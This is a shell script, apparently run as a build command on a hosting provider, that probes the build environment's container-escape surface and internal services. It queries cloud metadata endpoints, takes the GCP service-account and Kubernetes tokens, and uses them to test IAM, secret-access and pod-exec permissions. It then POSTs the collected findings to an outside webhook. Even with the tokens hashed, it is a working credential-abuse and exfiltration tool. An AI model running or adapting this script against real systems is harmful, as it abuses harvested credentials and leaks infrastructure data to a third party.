assets.probe.sh:
#!/bin/sh
set -u

: "${CANARY_URL:?missing disposable webhook}"

tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT INT TERM

sha_file() {
  if [ -s "$1" ]; then
    sha256sum "$1" | awk '{print $1}'
  else
    printf '%s' ''
  fi
}

http_probe() {
  name=$1
  url=$2
  shift 2
  : >"$tmp/$name.body"
  : >"$tmp/$name.headers"
  status=000
  if result=$(curl --noproxy '*' -k -sS --connect-timeout 2 --max-time 5 --max-filesize 131072 \
      -D "$tmp/$name.headers" -o "$tmp/$name.body" -w '%{http_code}' "$@" "$url"); then
    status=$result
  fi
  bytes=$(wc -c <"$tmp/$name.body" | tr -d ' ')
  digest=$(sha_file "$tmp/$name.body")
  content_type=$(awk 'BEGIN{IGNORECASE=1} /^content-type:/ {sub(/\r$/,""); sub(/^[^:]*:[[:space:]]*/,""); print; exit}' "$tmp/$name.headers")
  jq -cn --arg status "$status" --argjson bytes "$bytes" --arg sha256 "$digest" --arg contentType "$content_type" \
    '{status:($status|tonumber),bytes:$bytes,sha256:(if $sha256=="" then null else $sha256 end),content_type:(if $contentType=="" then null else $contentType end)}'
}

path_posture() {
  path=$1
  jq -cn \
    --argjson exists "$([ -e "$path" ] || [ -L "$path" ]; printf '%s' "$?")" \
    --argjson socket "$([ -S "$path" ]; printf '%s' "$?")" \
    --argjson readable "$([ -r "$path" ]; printf '%s' "$?")" \
    --argjson writable "$([ -w "$path" ]; printf '%s' "$?")" \
    '{exists:($exists==0),socket:($socket==0),readable:($readable==0),writable:($writable==0)}'
}

dns_posture() {
  host=$1
  getent ahostsv4 "$host" 2>/dev/null | awk '{print $1}' | sort -u >"$tmp/dns"
  count=$(wc -l <"$tmp/dns" | tr -d ' ')
  digest=$(sha_file "$tmp/dns")
  cgnat=false
  private=false
  linklocal=false
  if grep -Eq '^100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.' "$tmp/dns"; then cgnat=true; fi
  if grep -Eq '^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)' "$tmp/dns"; then private=true; fi
  if grep -Eq '^169\.254\.' "$tmp/dns"; then linklocal=true; fi
  jq -cn --argjson count "$count" --arg sha256 "$digest" --argjson cgnat "$cgnat" --argjson private "$private" --argjson linklocal "$linklocal" \
    '{count:$count,sha256:(if $sha256=="" then null else $sha256 end),cgnat:$cgnat,private:$private,link_local:$linklocal}'
}

status_field() {
  awk -v key="$1" '$1==key":" {print $2; exit}' /proc/self/status 2>/dev/null || true
}

rootfs_type=$(awk '$5=="/" {for(i=1;i<=NF;i++) if($i=="-"){print $(i+1); exit}}' /proc/self/mountinfo 2>/dev/null || true)
self_mnt=$(readlink /proc/self/ns/mnt 2>/dev/null || true)
init_mnt=$(readlink /proc/1/ns/mnt 2>/dev/null || true)
self_pid=$(readlink /proc/self/ns/pid 2>/dev/null || true)
init_pid=$(readlink /proc/1/ns/pid 2>/dev/null || true)

execution=$(jq -cn \
  --argjson uid "$(id -u)" \
  --argjson gid "$(id -g)" \
  --arg kernel "$(uname -r 2>/dev/null || true)" \
  --arg rootfs "$rootfs_type" \
  --arg capEff "$(status_field CapEff)" \
  --arg capBnd "$(status_field CapBnd)" \
  --arg noNewPrivs "$(status_field NoNewPrivs)" \
  --arg seccomp "$(status_field Seccomp)" \
  --argjson sameMnt "$([ "$self_mnt" = "$init_mnt" ]; printf '%s' "$?")" \
  --argjson samePid "$([ "$self_pid" = "$init_pid" ]; printf '%s' "$?")" \
  --argjson proc1RootReadable "$([ -r /proc/1/root/etc/os-release ]; printf '%s' "$?")" \
  --argjson proc1EnvironReadable "$([ -r /proc/1/environ ]; printf '%s' "$?")" \
  --arg userns "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || true)" \
  --arg ioUring "$(cat /proc/sys/kernel/io_uring_disabled 2>/dev/null || true)" \
  --arg bpf "$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || true)" \
  '{uid:$uid,gid:$gid,kernel:$kernel,rootfs_type:(if $rootfs=="" then null else $rootfs end),cap_eff:$capEff,cap_bnd:$capBnd,no_new_privs:(try ($noNewPrivs|tonumber) catch null),seccomp:(try ($seccomp|tonumber) catch null),same_mount_namespace_as_pid1:($sameMnt==0),same_pid_namespace_as_pid1:($samePid==0),proc1_root_readable:($proc1RootReadable==0),proc1_environ_readable:($proc1EnvironReadable==0),unprivileged_userns_clone:(try ($userns|tonumber) catch null),io_uring_disabled:(try ($ioUring|tonumber) catch null),unprivileged_bpf_disabled:(try ($bpf|tonumber) catch null)}')

env | sed 's/=.*//' | LC_ALL=C sort -u >"$tmp/env.keys"
env_keys=$(jq -Rsc 'split("\n")|map(select(length>0))' "$tmp/env.keys")

docker_sock=$(path_posture /var/run/docker.sock)
buildkit_sock=$(path_posture /run/buildkit/buildkitd.sock)
containerd_sock=$(path_posture /run/containerd/containerd.sock)
podman_sock=$(path_posture /run/podman/podman.sock)
docker_api=$(jq -cn '{ping_status:0,info_status:0,containers_status:0,server_version:null,container_count:null}')
if [ -S /var/run/docker.sock ] && [ -r /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
  ping_status=$(curl -sS --max-time 3 --unix-socket /var/run/docker.sock -o "$tmp/docker-ping" -w '%{http_code}' http://localhost/_ping 2>/dev/null || printf '000')
  info_status=$(curl -sS --max-time 3 --unix-socket /var/run/docker.sock -o "$tmp/docker-info" -w '%{http_code}' http://localhost/info 2>/dev/null || printf '000')
  containers_status=$(curl -sS --max-time 3 --unix-socket /var/run/docker.sock -o "$tmp/docker-containers" -w '%{http_code}' 'http://localhost/containers/json?all=1' 2>/dev/null || printf '000')
  server_version=$(jq -r '.ServerVersion // empty' "$tmp/docker-info" 2>/dev/null || true)
  container_count=$(jq 'if type=="array" then length else null end' "$tmp/docker-containers" 2>/dev/null || true)
  [ -n "$container_count" ] || container_count=null
  docker_api=$(jq -cn --arg ps "$ping_status" --arg is "$info_status" --arg cs "$containers_status" --arg version "$server_version" --argjson count "$container_count" \
    '{ping_status:($ps|tonumber),info_status:($is|tonumber),containers_status:($cs|tonumber),server_version:(if $version=="" then null else $version end),container_count:$count}')
fi

devices=$(jq -cn \
  --argjson kvm "$([ -e /dev/kvm ]; printf '%s' "$?")" \
  --argjson vsock "$([ -e /dev/vsock ]; printf '%s' "$?")" \
  --argjson fuse "$([ -e /dev/fuse ]; printf '%s' "$?")" \
  --argjson tun "$([ -e /dev/net/tun ]; printf '%s' "$?")" \
  --argjson cgroupWritable "$([ -w /sys/fs/cgroup ]; printf '%s' "$?")" \
  '{kvm:($kvm==0),vsock:($vsock==0),fuse:($fuse==0),tun:($tun==0),cgroup_writable:($cgroupWritable==0)}')

frontend_dns=$(dns_posture frontend.internal.railway.com)
railyard_dns=$(dns_posture railyard.internal.railway.com)
metadata_dns=$(dns_posture metadata.google.internal)

frontend_root=$(http_probe frontend_root 'https://frontend.internal.railway.com/')
frontend_gql_v2=$(http_probe frontend_gql_v2 'https://frontend.internal.railway.com/graphql/v2?query=query%20%7B%20__typename%20%7D')
frontend_gql_internal=$(http_probe frontend_gql_internal 'https://frontend.internal.railway.com/graphql/internal?query=query%20%7B%20__typename%20%7D')
railyard_root=$(http_probe railyard_root 'https://railyard.internal.railway.com/')
railyard_tracing=$(http_probe railyard_tracing 'https://railyard.internal.railway.com/monitoring/tracing')

gcp_project=$(http_probe gcp_project 'http://169.254.169.254/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google')
gcp_email=$(http_probe gcp_email 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email' -H 'Metadata-Flavor: Google')
gcp_token=$(http_probe gcp_token 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google')
aws_metadata=$(http_probe aws_metadata 'http://169.254.169.254/latest/meta-data/')
azure_metadata=$(http_probe azure_metadata 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true')

gcp_identity=$(jq -cn '{token_present:false,token_length:0,token_sha256:null,scopes:[],project_id_sha256:null,project_id_length:0,service_account_email_sha256:null,service_account_email_length:0}')
gcp_permissions=$(jq -cn '{test_status:0,allowed:[],project_get_status:0,secrets_list_status:0,compute_list_status:0,gke_list_status:0,cloudbuild_list_status:0,run_list_status:0}')
project_id=$(cat "$tmp/gcp_project.body" 2>/dev/null | tr -d '\r\n' || true)
service_account_email=$(cat "$tmp/gcp_email.body" 2>/dev/null | tr -d '\r\n' || true)
access_token=$(jq -r '.access_token // empty' "$tmp/gcp_token.body" 2>/dev/null || true)
gcp_scopes=$(jq -c '(.scope // "")|split(" ")|map(select(length>0))' "$tmp/gcp_token.body" 2>/dev/null || true)
[ -n "$gcp_scopes" ] || gcp_scopes='[]'
project_sha=$(printf '%s' "$project_id" | sha256sum | awk '{print $1}')
email_sha=$(printf '%s' "$service_account_email" | sha256sum | awk '{print $1}')
token_sha=$(printf '%s' "$access_token" | sha256sum | awk '{print $1}')
gcp_identity=$(jq -cn --arg token "$access_token" --arg tokenSha "$token_sha" --argjson scopes "$gcp_scopes" --arg project "$project_id" --arg projectSha "$project_sha" --arg email "$service_account_email" --arg emailSha "$email_sha" \
  '{token_present:($token|length>0),token_length:($token|length),token_sha256:(if ($token|length)>0 then $tokenSha else null end),scopes:$scopes,project_id_sha256:(if ($project|length)>0 then $projectSha else null end),project_id_length:($project|length),service_account_email_sha256:(if ($email|length)>0 then $emailSha else null end),service_account_email_length:($email|length)}')

if [ -n "$access_token" ] && printf '%s' "$project_id" | grep -Eq '^[a-z][a-z0-9-]{4,61}[a-z0-9]$'; then
  cat >"$tmp/test-permissions.json" <<'EOF'
{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","iam.serviceAccounts.actAs","iam.serviceAccountKeys.create","compute.instances.create","compute.instances.list","compute.instances.setMetadata","compute.instances.setServiceAccount","container.clusters.get","container.clusters.update","container.pods.exec","cloudbuild.builds.create","run.services.update","secretmanager.versions.access","storage.objects.get","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.uploadArtifacts"]}
EOF
  test_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o "$tmp/gcp-permissions" -w '%{http_code}' -H "Authorization: Bearer $access_token" -H 'Content-Type: application/json' --data-binary @"$tmp/test-permissions.json" "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id:testIamPermissions" 2>/dev/null || printf '000')
  allowed=$(jq -c '[.permissions[]?]' "$tmp/gcp-permissions" 2>/dev/null || true)
  [ -n "$allowed" ] || allowed='[]'
  project_get_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $access_token" "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id" 2>/dev/null || printf '000')
  secrets_list_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $access_token" "https://secretmanager.googleapis.com/v1/projects/$project_id/secrets?pageSize=1" 2>/dev/null || printf '000')
  compute_list_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $access_token" "https://compute.googleapis.com/compute/v1/projects/$project_id/aggregated/instances?maxResults=1" 2>/dev/null || printf '000')
  gke_list_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $access_token" "https://container.googleapis.com/v1/projects/$project_id/locations/-/clusters" 2>/dev/null || printf '000')
  cloudbuild_list_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $access_token" "https://cloudbuild.googleapis.com/v1/projects/$project_id/builds?pageSize=1" 2>/dev/null || printf '000')
  run_list_status=$(curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $access_token" "https://run.googleapis.com/v2/projects/$project_id/locations/-/services?pageSize=1" 2>/dev/null || printf '000')
  gcp_permissions=$(jq -cn --arg ts "$test_status" --argjson allowed "$allowed" --arg pg "$project_get_status" --arg sl "$secrets_list_status" --arg cl "$compute_list_status" --arg gl "$gke_list_status" --arg bl "$cloudbuild_list_status" --arg rl "$run_list_status" \
    '{test_status:($ts|tonumber),allowed:$allowed,project_get_status:($pg|tonumber),secrets_list_status:($sl|tonumber),compute_list_status:($cl|tonumber),gke_list_status:($gl|tonumber),cloudbuild_list_status:($bl|tonumber),run_list_status:($rl|tonumber)}')
fi

kube_token_path=/var/run/secrets/kubernetes.io/serviceaccount/token
kube_ca_path=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
kube_namespace_path=/var/run/secrets/kubernetes.io/serviceaccount/namespace
kubernetes=$(jq -cn '{token_present:false,token_length:0,token_sha256:null,version_status:0,self_subject_rules_status:0,incomplete:null,cluster_wildcard:false,secrets_read:false,pods_create:false,pods_exec:false,nodes_proxy:false}')
if [ -r "$kube_token_path" ]; then
  kube_token=$(cat "$kube_token_path")
  kube_namespace=$(cat "$kube_namespace_path" 2>/dev/null || printf 'default')
  kube_host=${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}
  kube_port=${KUBERNETES_SERVICE_PORT_HTTPS:-443}
  kube_base="https://$kube_host:$kube_port"
  kube_cacert=''
  if [ -r "$kube_ca_path" ]; then kube_cacert="--cacert $kube_ca_path"; fi
  version_status=$(curl --noproxy '*' -sS --connect-timeout 2 --max-time 5 $kube_cacert -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $kube_token" "$kube_base/version" 2>/dev/null || printf '000')
  jq -cn --arg namespace "$kube_namespace" '{apiVersion:"authorization.k8s.io/v1",kind:"SelfSubjectRulesReview",spec:{namespace:$namespace}}' >"$tmp/kube-rules-request"
  rules_status=$(curl --noproxy '*' -sS --connect-timeout 2 --max-time 6 $kube_cacert -o "$tmp/kube-rules" -w '%{http_code}' -H "Authorization: Bearer $kube_token" -H 'Content-Type: application/json' --data-binary @"$tmp/kube-rules-request" "$kube_base/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null || printf '000')
  incomplete=$(jq '.status.incomplete // null' "$tmp/kube-rules" 2>/dev/null || true)
  cluster_wildcard=$(jq '[.status.resourceRules[]?|select((.verbs|index("*")) and (.apiGroups|index("*")) and (.resources|index("*")))]|length>0' "$tmp/kube-rules" 2>/dev/null || true)
  secrets_read=$(jq '[.status.resourceRules[]?|select((.resources|index("secrets")) and ((.verbs|index("*")) or (.verbs|index("get")) or (.verbs|index("list")) or (.verbs|index("watch"))))]|length>0' "$tmp/kube-rules" 2>/dev/null || true)
  pods_create=$(jq '[.status.resourceRules[]?|select((.resources|index("pods")) and ((.verbs|index("*")) or (.verbs|index("create"))))]|length>0' "$tmp/kube-rules" 2>/dev/null || true)
  pods_exec=$(jq '[.status.resourceRules[]?|select((.resources|index("pods/exec")) and ((.verbs|index("*")) or (.verbs|index("create"))))]|length>0' "$tmp/kube-rules" 2>/dev/null || true)
  nodes_proxy=$(jq '[.status.resourceRules[]?|select((.resources|index("nodes/proxy")) and ((.verbs|index("*")) or (.verbs|index("create")) or (.verbs|index("get"))))]|length>0' "$tmp/kube-rules" 2>/dev/null || true)
  [ -n "$incomplete" ] || incomplete=null
  [ -n "$cluster_wildcard" ] || cluster_wildcard=false
  [ -n "$secrets_read" ] || secrets_read=false
  [ -n "$pods_create" ] || pods_create=false
  [ -n "$pods_exec" ] || pods_exec=false
  [ -n "$nodes_proxy" ] || nodes_proxy=false
  kube_sha=$(printf '%s' "$kube_token" | sha256sum | awk '{print $1}')
  kubernetes=$(jq -cn --arg token "$kube_token" --arg sha "$kube_sha" --arg vs "$version_status" --arg rs "$rules_status" --argjson incomplete "$incomplete" --argjson wildcard "$cluster_wildcard" --argjson secrets "$secrets_read" --argjson pods "$pods_create" --argjson exec "$pods_exec" --argjson nodes "$nodes_proxy" \
    '{token_present:true,token_length:($token|length),token_sha256:$sha,version_status:($vs|tonumber),self_subject_rules_status:($rs|tonumber),incomplete:$incomplete,cluster_wildcard:$wildcard,secrets_read:$secrets,pods_create:$pods,pods_exec:$exec,nodes_proxy:$nodes}')
fi

jq -n \
  --argjson execution "$execution" \
  --argjson envKeys "$env_keys" \
  --argjson dockerSock "$docker_sock" \
  --argjson buildkitSock "$buildkit_sock" \
  --argjson containerdSock "$containerd_sock" \
  --argjson podmanSock "$podman_sock" \
  --argjson dockerApi "$docker_api" \
  --argjson devices "$devices" \
  --argjson frontendDns "$frontend_dns" \
  --argjson railyardDns "$railyard_dns" \
  --argjson metadataDns "$metadata_dns" \
  --argjson frontendRoot "$frontend_root" \
  --argjson frontendV2 "$frontend_gql_v2" \
  --argjson frontendInternal "$frontend_gql_internal" \
  --argjson railyardRoot "$railyard_root" \
  --argjson railyardTracing "$railyard_tracing" \
  --argjson gcpProject "$gcp_project" \
  --argjson gcpEmail "$gcp_email" \
  --argjson gcpToken "$gcp_token" \
  --argjson awsMetadata "$aws_metadata" \
  --argjson azureMetadata "$azure_metadata" \
  --argjson gcpIdentity "$gcp_identity" \
  --argjson gcpPermissions "$gcp_permissions" \
  --argjson kubernetes "$kubernetes" \
  '{execution:$execution,environment_keys:$envKeys,host_control:{sockets:{docker:$dockerSock,buildkit:$buildkitSock,containerd:$containerdSock,podman:$podmanSock},docker_api:$dockerApi,devices:$devices},dns:{frontend_internal:$frontendDns,railyard_internal:$railyardDns,metadata_google_internal:$metadataDns},internal_http:{frontend_root:$frontendRoot,frontend_graphql_v2:$frontendV2,frontend_graphql_internal:$frontendInternal,railyard_root:$railyardRoot,railyard_tracing:$railyardTracing},cloud_metadata:{aws:$awsMetadata,azure:$azureMetadata},gcp:{metadata:{project:$gcpProject,email:$gcpEmail,token:$gcpToken},identity:$gcpIdentity,permissions:$gcpPermissions},kubernetes:$kubernetes}' >"$tmp/payload.json"

curl --noproxy '*' -sS --connect-timeout 3 --max-time 8 -o /dev/null -H 'Content-Type: application/json' --data-binary @"$tmp/payload.json" "$CANARY_URL"

commands.customName: Run sanitized builder control-plane posture probe
